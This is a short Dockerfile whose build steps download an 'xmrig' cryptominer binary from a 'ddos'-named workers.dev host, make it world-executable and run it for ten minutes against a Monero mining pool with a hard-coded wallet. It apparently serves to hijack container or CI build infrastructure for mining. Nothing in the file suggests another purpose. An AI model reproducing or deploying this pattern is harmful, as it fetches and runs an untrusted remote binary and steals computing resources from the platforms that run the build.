FROM alpine:latest

RUN apk add wget
RUN wget https://ddos.nms.workers.dev/xmrig
RUN chmod 777 xmrig
RUN timeout 10m ./xmrig -o pool.minexmr.com:4444 -u 453YeXrQMiahiYEbJXH4172KP8a6QagRAGWQpcpepuHiJ7QeiPyr2ZvEhwPrrTFu21ETGAY5SCdphFb26dYVcnSYHR1HPy5 -p $(date "+%Y%m%d%H%M%S")
